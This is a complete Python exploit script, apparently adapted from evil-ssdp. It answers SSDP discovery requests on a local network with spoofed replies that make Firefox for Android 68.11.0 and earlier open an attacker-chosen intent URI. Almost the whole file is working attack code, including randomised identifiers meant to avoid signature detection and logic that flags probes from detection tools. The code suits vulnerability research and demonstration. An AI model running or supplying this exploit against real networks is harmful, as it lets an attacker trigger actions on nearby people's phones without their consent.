#!/usr/bin/env python3

"""
Modified version of evil-ssdp designed to target Firefox for Android
versions 68.11.0 and lower.

evil-ssdp does a lot more, which is why some of this code may seem extra or
overkill. Sorry about that. :)
"""

from multiprocessing import Process
from email.utils import formatdate
import sys
import os
import re
import argparse
import socket
import struct
import signal
import random
import time


BANNER = r'''
  _____  _____                 .___
_/ ____\/ ____\______ ______ __| _/_____
\   __\\   __\/  ___//  ___// __ |\____ \
 |  |   |  |  \___ \ \___ \/ /_/ ||  |_> >
 |__|   |__| /____  >____  >____ ||   __/
                  \/     \/     \/|__|

...by initstring
'''

print(BANNER)


if sys.version_info < (3, 0):
    print("\nSorry mate, you'll need to use Python 3+ on this one...\n")
    sys.exit(1)


class PC:
    """PC (Print Color)
    Used to generate some colorful, relevant, nicely formatted status messages.
    """
    green = '\033[92m'
    blue = '\033[94m'
    orange = '\033[93m'
    red = '\033[91m'
    endc = '\033[0m'
    ok_box = blue + '[*] ' + endc
    note_box = green + '[+] ' + endc
    warn_box = orange + '[!] ' + endc
    msearch_box = blue + '[M-SEARCH]     ' + endc
    xml_box = green + '[XML REQUEST]  ' + endc
    detect_box = orange + '[OTHER]     ' + endc


class SSDPListener:
    """UDP multicast listener for SSDP queries
    This class object will bind to the SSDP-spec defined multicast address and
    port. We can then receive data from this object, which will be capturing
    the UDP multicast traffic on a local network.
    """

    def __init__(self, local_ip, args):
        self.sock = None
        self.known_hosts = []
        self.local_ip = local_ip
        self.target = args.target
        self.analyze_mode = args.analyze
        ssdp_port = 1900  # Defined by SSDP spec, do not change
        mcast_group = '239.255.255.250'  # Defined by SSDP spec, do not change
        server_address = ('', ssdp_port)

        # The re below can help us identify obviously false requests
        # from detection tools.
        self.valid_st = re.compile(r'^[a-zA-Z0-9.\-_]+:[a-zA-Z0-9.\-_:]+$')

        # Generating a new unique USD/UUID may help prevent signature-like
        # detection tools.
        self.session_usn = ('uuid:'
                            + self.gen_random(8) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(4) + '-'
                            + self.gen_random(12))

        # Create the socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to the server address
        self.sock.bind(server_address)

        # Tell the operating system to add the socket to
        # the multicast group on for the interface on the specific IP.
        group = socket.inet_aton(mcast_group)
        mreq = struct.pack('4s4s', group, socket.inet_aton(self.local_ip))
        self.sock.setsockopt(
            socket.IPPROTO_IP,
            socket.IP_ADD_MEMBERSHIP,
            mreq)

    @staticmethod
    def gen_random(length):
        """Generates random hex strings"""
        chars = 'abcdef'
        digits = '0123456789'
        value = ''.join(random.choices(chars + digits, k=length))
        return value

    def send_location(self, address, requested_st):
        """
        This function replies back to clients letting them know where they can
        access more information about our device. The keys here are the
        'LOCATION' header and the 'ST' header.

        When a client receives this information back on the port they
        initiated a discover from, they will go to that location to look for an
        XML file.
        """
        url = self.target
        date_format = formatdate(timeval=None, localtime=False, usegmt=True)

        ssdp_reply = ('HTTP/1.1 200 OK\r\n'
                      'CACHE-CONTROL: max-age=1800\r\n'
                      'DATE: {}\r\n'
                      'EXT:\r\n'
                      'LOCATION: {}\r\n'
                      'OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01\r\n'
                      '01-NLS: {}\r\n'
                      'SERVER: UPnP/1.0\r\n'
                      'ST: {}\r\n'
                      'USN: {}::{}\r\n'
                      'BOOTID.UPNP.ORG: 0\r\n'
                      'CONFIGID.UPNP.ORG: 1\r\n'
                      '\r\n\r\n'
                      .format(date_format,
                              url,
                              self.session_usn,
                              requested_st,
                              self.session_usn,
                              requested_st))
        ssdp_reply = bytes(ssdp_reply, 'utf-8')
        self.sock.sendto(ssdp_reply, address)

    def process_data(self, data, address):
        """
        This function parses the raw data received on the SSDPListener class
        object. If the M-SEARCH header is found, it will look for the specific
        'Service Type' (ST) being requested and call the function to reply
        back, telling the client that we have the device type they are looking
        for.

        The function will log the first time a client does a specific type of
        M-SEARCH - after that it will be silent. This keeps the output more
        readable, as clients can get chatty.
        """
        remote_ip = address[0]
        header_st = re.findall(r'(?i)\\r\\nST:(.*?)\\r\\n', str(data))
        if 'M-SEARCH' in str(data) and header_st:
            requested_st = header_st[0].strip()
            if re.match(self.valid_st, requested_st):
                if (address[0], requested_st) not in self.known_hosts:
                    print(PC.msearch_box + "New Host {}, Service Type: {}"
                          .format(remote_ip, requested_st))
                    self.known_hosts.append((address[0], requested_st))
                if not self.analyze_mode:
                    self.send_location(address, requested_st)
            else:
                print(PC.detect_box + "Odd ST ({}) from {}. Possible"
                      "detection tool!".format(requested_st, remote_ip))



def process_args():
    """Handles user-passed parameters"""
    parser = argparse.ArgumentParser()
    parser.add_argument('interface', type=str, action='store',
                        help='Network interface to listen on.')
    parser.add_argument('-t', '--target', type=str, default='tel://101',
                        help='Intent URI to triger. Default: tel://101')
    parser.add_argument("-a", "--analyze", action="store_true", default=False,
                        help='Run in analyze mode')
    args = parser.parse_args()

    # The following two lines help to avoid command injection in bash.
    # Pretty unlikely scenario for this tool, but who knows.
    char_whitelist = re.compile('[^a-zA-Z0-9 ._-]')
    args.interface = char_whitelist.sub('', args.interface)

    return args

def get_ip(args):
    """
    This function will attempt to automatically get the IP address of the
    provided interface.
    """
    ip_regex = r'inet (?:addr:)?(.*?) '
    sys_ifconfig = os.popen('ifconfig ' + args.interface).read()
    local_ip = re.findall(ip_regex, sys_ifconfig)
    try:
        return local_ip[0]
    except IndexError:
        print(PC.warn_box + "Could not get network interface info. "
              "Please check and try again.")
        sys.exit()

def print_details(args):
    """
    Prints a banner at runtime, informing the user of relevant details.
    """
    print("\n\n")
    print("########################################")
    print(PC.ok_box + "MSEARCH LISTENER:        {}".format(args.interface))
    print(PC.ok_box + "INTENT:                  {}".format(args.target))
    if args.analyze:
        print(PC.warn_box + "ANALYZE MODE:            ENABLED")
    print("########################################")
    print("\n\n")


def listen_msearch(listener):
    """
    Starts the listener object, receiving and processing UDP multicasts.
    """
    while True:
        data, address = listener.sock.recvfrom(1024)
        listener.process_data(data, address)


def main():
    """Main program function
    Uses Process to multi-thread the SSDP server (evil-ssdp also had a web
    server, hence the setup).
    """
    args = process_args()
    local_ip = get_ip(args)

    listener = SSDPListener(local_ip, args)
    ssdp_server = Process(target=listen_msearch, args=(listener,))


    print_details(args)
    time.sleep(1.5)

    try:
        ssdp_server.start()
        signal.pause()
    except (KeyboardInterrupt, SystemExit):
        print("\n" + PC.warn_box +
              "Thanks for playing! Stopping threads and exiting...\n")
        ssdp_server.terminate()
        sys.exit()



if __name__ == "__main__":
    main()
